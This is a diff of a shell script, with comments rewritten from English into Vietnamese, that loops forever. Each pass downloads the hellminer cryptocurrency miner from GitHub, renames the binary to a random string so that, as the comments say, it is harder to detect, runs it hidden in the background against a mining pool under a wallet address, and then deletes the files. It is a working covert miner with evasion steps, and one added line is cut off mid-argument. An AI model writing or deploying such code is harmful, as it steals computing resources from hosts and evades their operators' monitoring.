@@ -1,42 +1,36 @@
-#!/bin/sh
+#!/bin/bash
 
-# Function to generate a random name based on SHA-512 hash
+# Tạo một tên tệp ngẫu nhiên để khó phát hiện hơn
 generate_random_name() {
-  # Generate random string
-  random_string=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12 ; echo '')
-
-  # Calculate SHA-512 hash of random string and trim to 12 characters
-  random_name=$(echo -n "$random_string" | sha512sum | awk '{print substr($1, 1, 12)}')
-  echo "$random_name"
+  tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 12
 }
 
-# Infinite loop to continuously run the script
+# Vòng lặp vô hạn để script chạy liên tục
 while true; do
-  # Download file
+  # Tải file
   wget -q https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz
 
-  # Extract file
+  # Giải nén file
   tar -xf hellminer_linux64_avx2.tar.gz
   rm -f hellminer_linux64_avx2.tar.gz
   rm -rf run_miner.sh
   rm -rf verus-solver
-
-  # Generate random name
+  # Đổi tên file để khó phát hiện hơn
   random_name=$(generate_random_name)
   mv hellminer "$random_name"
 
-  # Run the program for 1 minute with renamed file, anonymously and in background
-  nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vpsgithub --cpu 2 >/dev/null 2>&1 &
+  # Chạy chương trình trong 1 phút với tên đã đổi, ẩn danh và chạy ngầm
+  nohup ./"$random_name" -c stratum+tcp://ap.vipor.net:5040 -u RMWTqPzqBZCP3LT893jwxwNhEbs6umRGWw.vp>
   miner_pid=$!
-  sleep 1m
+  sleep 2m
 
-  # Stop the program
+  # Dừng chương trình
   kill $miner_pid
 
-  # Clean up downloaded and extracted files
+  # Xóa các file đã tải và giải nén
   rm -f hellminer_linux64_avx2.tar.gz
   rm -rf "$random_name"
-  
-  # Pause for 2 minutes before looping again
+
+  # Nghỉ 1 phút trước khi lặp lại
   sleep 2m
 done
